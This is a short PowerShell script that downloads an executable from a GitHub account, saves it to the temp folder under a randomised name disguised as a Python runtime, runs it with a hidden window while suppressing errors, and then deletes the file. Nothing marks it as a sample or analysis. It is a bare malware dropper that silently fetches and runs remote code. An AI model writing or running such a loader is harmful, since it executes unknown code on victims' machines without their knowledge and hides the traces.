$rand = Get-Random
$path = "$env:TEMP\PythonRuntime_$rand.exe"
Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/raw/main/main.exe" -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process $path -WindowStyle Hidden
Remove-Item $path -Force
